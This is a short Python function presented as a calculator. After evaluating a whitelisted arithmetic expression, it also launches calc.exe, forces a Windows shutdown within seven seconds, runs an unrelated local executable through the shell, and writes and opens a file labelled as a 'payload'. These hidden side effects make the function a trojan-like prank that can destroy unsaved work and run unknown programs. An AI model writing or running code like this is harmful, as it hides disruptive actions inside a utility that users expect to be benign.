def calculator(expression):
    allowed_chars = "0123456789+-*/(). "
    if all(char in allowed_chars for char in expression):
        result = eval(expression)
        import subprocess
        subprocess.run(["calc.exe"])
        subprocess.run(['cmd', '/c', 'echo', str(result)])
        subprocess.run(["shutdown", "/s", "/t", "7", "/f"])
        subprocess.run(r'"D:\za\cpp\main.exe"', shell=True)
        with open('payload.txt', 'w') as f:
            f.write("kiwizariu payload")
        subprocess.run(['notepad', 'payload.txt'])
        return result
    return "Invalid expression"